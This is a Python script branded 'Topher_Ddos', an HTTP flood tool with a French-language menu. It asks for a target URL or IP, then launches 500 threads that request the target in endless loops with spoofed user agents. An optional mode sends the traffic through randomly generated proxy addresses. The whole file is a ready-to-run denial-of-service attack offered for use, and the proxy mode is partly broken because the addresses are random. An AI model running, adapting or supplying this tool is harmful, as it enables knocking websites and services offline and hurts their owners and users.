from datetime import datetime
import socket
import threading
import urllib.request
import argparse
import random

from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener
from pyfiglet import Figlet
F = '\033[1;32m'
Z = '\033[1;31m'
S = '\033[1;33m'
B = '\x1b[38;5;208m'

fig = Figlet(font='slant')
logo = fig.renderText(f'Topher_Ddos')

print(logo)
def linked():
    sg = input(
        f'''
═════════════════════════════════
{Z}[1] Attack sans Proxy -TopherDDOS
═════════════════════════════════
{S}[2] Attack avec Proxy - TopherDDOS 
═════════════════════════════════
{S}[{S}⌯{S}]{F}Choisis un chiffre.{F}» '''
    )
    if sg == '1':
        for _ in range(500):
            threading.Thread(target=AttackMahos).start()
    elif sg == '2':
        for _ in range(500):
            threading.Thread(target=ProxyAttack).start()

def AttackMahos():
    while True:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': generate_user_agent()
        }
        try:
            req = urllib.request.urlopen(
                urllib.request.Request(url, headers=headers)
            )
            if req.status == 200:
                print(f'{F}GOOD Attack: {url}')
            else:
                print(f'{Z}BAD Attack: {url}')
        except:
            print(f'{S}DOWN: {url}')
def ProxyAttack():
    while True:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': generate_user_agent()
        }
        try:
            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'{F}GOOD Attack: {url} | {proxy}')
            else:
                print(f'{Z}BAD Attack: {url} | {proxy}')
        except:
            print(f'{S}DOWN: {url} |')



url = input(f'{B}ENTER URL OR IP ADDRESS : ')
linked()